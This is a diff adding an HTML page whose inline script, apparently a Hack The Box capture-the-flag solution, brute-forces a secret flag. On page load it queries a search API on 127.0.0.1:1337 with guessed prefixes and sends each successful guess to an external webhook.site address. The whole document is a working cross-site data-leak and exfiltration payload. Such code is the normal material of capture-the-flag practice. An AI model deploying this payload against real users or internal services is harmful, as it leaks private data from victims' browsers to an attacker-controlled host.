@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<body>
+    <script>
+    var whook = 'https://webhook.site/71d7a125-b1bc-4a4f-9437-9797de9ba489/'
+    var url = "http://127.0.0.1:1337/api/entries/search?q=";
+    var htb = 'HTB';
+    letters = '';
+    
+    // flag characters
+    for(var i=33; i<127; i++){
+        letters += String.fromCharCode(i);
+    }
+    console.log(letters);
+    for(var i=0; i<letters.length; i++){
+        var guess = htb + letters[i];
+        fetch(url+guess)
+        .then(response => {
+            if(response.ok){
+                fetch(whook+guess)
+                
+            }
+        })
+        .catch(error => {})
+    }
+    </script>
+</body>
